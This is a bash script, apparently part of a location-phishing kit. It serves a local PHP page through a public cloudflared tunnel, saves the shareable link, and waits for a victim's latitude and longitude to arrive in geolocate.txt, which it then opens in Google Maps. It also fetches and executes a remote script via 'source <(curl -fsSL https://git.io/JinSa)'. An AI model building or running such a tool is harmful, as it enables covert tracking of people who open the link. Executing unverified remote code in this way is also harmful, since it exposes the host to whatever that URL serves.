#!/usr/bin/env bash
FILE=/root/Desktop/Target/server/link.txt
if test -f "$FILE"; then
    rm -rf $FILE
fi
CWD=`pwd`;script="$0"; arg1="$1"; arg2="$2" arg3="$3"; OS=`uname -o`; arch=`uname -m`
S0="\033[30m"; B0="\033[40m"; S1="\033[31m"; B1="\033[41m"; S2="\033[32m"; B2="\033[42m"; S3="\033[33m"; B3="\033[43m"; S4="\033[34m"; B4="\033[44m"; S5="\033[35m"; B5="\033[45m"; S6="\033[36m"; B6="\033[46m"; S7="\033[37m"; B7="\033[47m"; R0="\033[0;00m"
if [[ ${OS,,} == *'android'* ]]; then
  if [[ $CWD == *'com.termux'* ]]; then
    export PREFIX='/data/data/com.termux/files/usr'
    INS() {
      apt install $1 -y
    }
    spkg=(termux-tools termux-exex)
    if ! hash termux-chroot >/dev/null 2>&1; then
      INS proot>/dev/null 2>&1 | printf "${S2}Installing:: package: proot${R0}\n"
      for pk in ${spkg[@]}; do
        if ! dpkg --list | grep "$pk" >/dev/null; then
          INS $px >/dev/null 2>&1 | printf "${S2}Installing:: package: ${pk}${R0}\n"
        fi
      done
    fi
  else
    printf "${S2}[${S1}!${S2}] ${S4}You are using unknown software! You may edit this script to run it on your software!${R0}\n"
    exit 1
  fi
elif [[ ${OS,,} == *'linux'* ]]; then
  export PREFIX='/usr'
  INS() {
    sudo apt install $1 -y
  }
else
  printf "${S2}[${S1}!${S2}] ${S4}You are using unknown software! you may edit this script to run it on your software!${R0}\n"
  exit 1
fi
if ! hash cloudflared > /dev/null 2>&1; then
  source <(curl -fsSL "https://git.io/JinSa")
fi
killPhp() {
  rm -rf $CWD/php-Log >/dev/null 2>&1
  pidk=$(ps aux | grep -w 'php' | awk '{print $2}')
  kill $pidk >/dev/null 2>&1
  killall php >/dev/null 2>&1
}
killCloudflare() {
  rm -rf $CWD/cloudflared-log >/dev/null 2>&1
  pidc=$(ps aux | grep -w "cloudflared" | awk '{print $2}')
  kill $pidc >/dev/null 2>&1
  killall php >/dev/null 2>&1
}
startPhp() {
  php -S 127.0.0.1:3333 >$CWD/php-Log 2>&1 &
  sleep 5
}
startCloudflare() {
  if [[ ${OS,,} == *'android'* ]]; then
    termux-chroot cloudflared -url 127.0.0.1:3333 --logfile $CWD/cloudflared-log >/dev/null 2>&1 &
  else
    cloudflared -url 127.0.0.1:3333 --logfile $CWD/cloudflared-log >/dev/null 2>&1 &
  fi
  sleep 4
}
#<<<------program------>>>#
if [ ! -d $CWD/server ]; then
  printf "${S2}[${S1}!${S2}] ${S4}Resources are missing!${R0}\n"
  exit 1
fi
cd $CWD/server >/dev/null 2>&1
rm -rf $CWD/server/geolocate.txt >/dev/null 2>&1
killPhp; killCloudflare
startPhp; startCloudflare
while true; do
  link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "${CWD}/cloudflared-log")
  if [[ ! -z ${link} ]]; then
    printf "${S5}Forwading on${S1}::${S7} %s${R0}\n" $link
    printf $link > link.txt
    break
  else
    sleep 0.125
  fi
done
listener() {
  printf "\n\n${S2}        <<--<Listening-->>${R0}\n"
  while true; do
    if [ -f $CWD/server/geolocate.txt ]; then
      Latitude=$(cat $CWD/server/geolocate.txt | grep Latitude | awk '{print $2}')
      Longitude=$(cat $CWD/server/geolocate.txt |grep Longitude | awk '{print $2}')
      rm -rf $CWD/server/geolocate.txt >/dev/null 2>&1
      break
    else
      sleep 0.125
    fi
  done
  printf "Location: %s\n" """https://maps.google.com/maps?q="${Latitude}","${Longitude}""""
  if [[ $arg1 == '-s' || $arg1 == '--silent' ]]; then
    :
  else
    xdg-open """https://maps.google.com/maps?q="${Latitude}","${Longitude}""""
  fi
  listener
}
listener
